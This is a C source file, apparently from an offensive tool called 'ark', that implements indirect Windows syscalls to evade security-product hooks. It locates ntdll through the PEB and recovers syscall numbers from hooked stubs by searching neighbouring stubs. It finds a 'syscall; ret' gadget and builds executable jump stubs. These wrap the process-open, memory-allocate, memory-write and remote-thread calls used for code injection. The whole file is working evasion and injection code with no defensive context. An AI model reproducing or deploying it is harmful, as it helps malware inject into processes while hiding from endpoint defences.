#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <string.h>

#include "ark/syscall.h"

#define ARK_MAX_SYSCALLS 8

typedef struct ark_syscall_entry {
    DWORD  ssn;
    PVOID  stub;
    char   name[48];
} ark_syscall_entry;

static ark_syscall_entry g_syscalls[ARK_MAX_SYSCALLS];
static int g_syscall_count = 0;

static PVOID ark_get_ntdll(void) {
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    for (PLIST_ENTRY cur = head->Flink; cur != head; cur = cur->Flink) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->FullDllName.Buffer && wcsstr(entry->FullDllName.Buffer, L"ntdll.dll")) {
            return entry->DllBase;
        }
    }
    return NULL;
}

static DWORD ark_resolve_ssn_name(PVOID ntdll, const char *target) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)ntdll + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)ntdll +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD *names = (DWORD *)((BYTE *)ntdll + exp->AddressOfNames);
    WORD *ords = (WORD *)((BYTE *)ntdll + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)((BYTE *)ntdll + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *fn = (char *)((BYTE *)ntdll + names[i]);
        if (strcmp(fn, target) != 0) continue;
        BYTE *stub = (BYTE *)((BYTE *)ntdll + funcs[ords[i]]);
        if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8)
            return *(DWORD *)(stub + 4);
        for (int d = 1; d < 32; d++) {
            BYTE *up = stub + d * 32;
            BYTE *dn = stub - d * 32;
            if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8)
                return *(DWORD *)(up + 4) - d;
            if (dn[0] == 0x4C && dn[1] == 0x8B && dn[2] == 0xD1 && dn[3] == 0xB8)
                return *(DWORD *)(dn + 4) + d;
        }
    }
    return 0xFFFFFFFF;
}

static PVOID ark_find_gadget(PVOID ntdll) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)ntdll + dos->e_lfanew);
    DWORD size = nt->OptionalHeader.SizeOfImage;
    BYTE *base = (BYTE *)ntdll;
    for (DWORD i = 0; i + 2 < size; i++) {
        if (base[i] == 0x0F && base[i + 1] == 0x05 && base[i + 2] == 0xC3)
            return &base[i];
    }
    return NULL;
}

#ifdef _WIN64
#pragma pack(push, 1)
typedef struct ark_jmp_gadget {
    BYTE mov_r10_rcx[3];
    BYTE mov_eax[1];
    DWORD ssn;
    BYTE jmp[6];
    UINT64 gadget;
} ark_jmp_gadget;
#pragma pack(pop)

static PVOID ark_build_stub(DWORD ssn, PVOID gadget) {
    ark_jmp_gadget *s = (ark_jmp_gadget *)VirtualAlloc(
        NULL, sizeof(ark_jmp_gadget), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!s) return NULL;
    s->mov_r10_rcx[0] = 0x4C; s->mov_r10_rcx[1] = 0x8B; s->mov_r10_rcx[2] = 0xD1;
    s->mov_eax[0] = 0xB8;
    s->ssn = ssn;
    s->jmp[0] = 0xFF; s->jmp[1] = 0x25;
    s->jmp[2] = 0x00; s->jmp[3] = 0x00; s->jmp[4] = 0x00; s->jmp[5] = 0x00;
    s->gadget = (UINT64)(ULONG_PTR)gadget;
    DWORD old;
    VirtualProtect(s, sizeof(*s), PAGE_EXECUTE_READ, &old);
    return s;
}
#endif

static int ark_register(const char *name, PVOID ntdll, PVOID gadget) {
    if (g_syscall_count >= ARK_MAX_SYSCALLS) return 0;
    DWORD ssn = ark_resolve_ssn_name(ntdll, name);
    if (ssn == 0xFFFFFFFF) return 0;
#ifdef _WIN64
    PVOID stub = ark_build_stub(ssn, gadget);
    if (!stub) return 0;
#else
    PVOID stub = NULL;
#endif
    ark_syscall_entry *e = &g_syscalls[g_syscall_count++];
    e->ssn = ssn;
    e->stub = stub;
    strncpy(e->name, name, sizeof(e->name) - 1);
    return 1;
}

static ark_syscall_entry *ark_lookup(const char *name) {
    for (int i = 0; i < g_syscall_count; i++)
        if (strcmp(g_syscalls[i].name, name) == 0) return &g_syscalls[i];
    return NULL;
}

int ark_syscall_init(void) {
    PVOID ntdll = ark_get_ntdll();
    PVOID gadget = ntdll ? ark_find_gadget(ntdll) : NULL;
    if (!ntdll || !gadget) return 0;
    ark_register("NtAllocateVirtualMemory", ntdll, gadget);
    ark_register("NtWriteVirtualMemory", ntdll, gadget);
    ark_register("NtProtectVirtualMemory", ntdll, gadget);
    ark_register("NtCreateThreadEx", ntdll, gadget);
    ark_register("NtOpenProcess", ntdll, gadget);
    return g_syscall_count > 0;
}

#ifdef _WIN64
typedef NTSTATUS (NTAPI *ark_stub_fn)(PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID);

#define ARK_INVOKE(name, ...) do { \
    ark_syscall_entry *_e = ark_lookup(name); \
    if (!_e || !_e->stub) return (NTSTATUS)0xC0000001L; \
    return ((ark_stub_fn)_e->stub)(__VA_ARGS__); \
} while (0)
#else
#define ARK_INVOKE(name, ...) return (NTSTATUS)0xC0000001L
#endif

NTSTATUS ark_NtAllocateVirtualMemory(HANDLE h, PVOID *base, ULONG_PTR z, PSIZE_T sz, ULONG type, ULONG prot) {
    ARK_INVOKE("NtAllocateVirtualMemory", h, base, (PVOID)z, sz, (PVOID)(ULONG_PTR)type, (PVOID)(ULONG_PTR)prot, NULL, NULL, NULL, NULL, NULL);
}

NTSTATUS ark_NtWriteVirtualMemory(HANDLE h, PVOID base, PVOID buf, SIZE_T n, PSIZE_T written) {
    ARK_INVOKE("NtWriteVirtualMemory", h, base, buf, (PVOID)n, written, NULL, NULL, NULL, NULL, NULL, NULL);
}

NTSTATUS ark_NtProtectVirtualMemory(HANDLE h, PVOID *base, PSIZE_T sz, ULONG prot, PULONG old) {
    ARK_INVOKE("NtProtectVirtualMemory", h, base, sz, (PVOID)(ULONG_PTR)prot, old, NULL, NULL, NULL, NULL, NULL, NULL);
}

NTSTATUS ark_NtCreateThreadEx(PHANDLE th, ACCESS_MASK acc, PVOID oa, HANDLE proc, PVOID start, PVOID arg,
    ULONG flags, SIZE_T zb, SIZE_T ss, SIZE_T mss, PVOID al) {
    ARK_INVOKE("NtCreateThreadEx", th, (PVOID)(ULONG_PTR)acc, oa, proc, start, arg,
        (PVOID)(ULONG_PTR)flags, (PVOID)zb, (PVOID)ss, (PVOID)mss, al);
}

NTSTATUS ark_NtOpenProcess(PHANDLE h, ACCESS_MASK acc, PVOID oa, PVOID cid) {
    ARK_INVOKE("NtOpenProcess", h, (PVOID)(ULONG_PTR)acc, oa, cid, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
}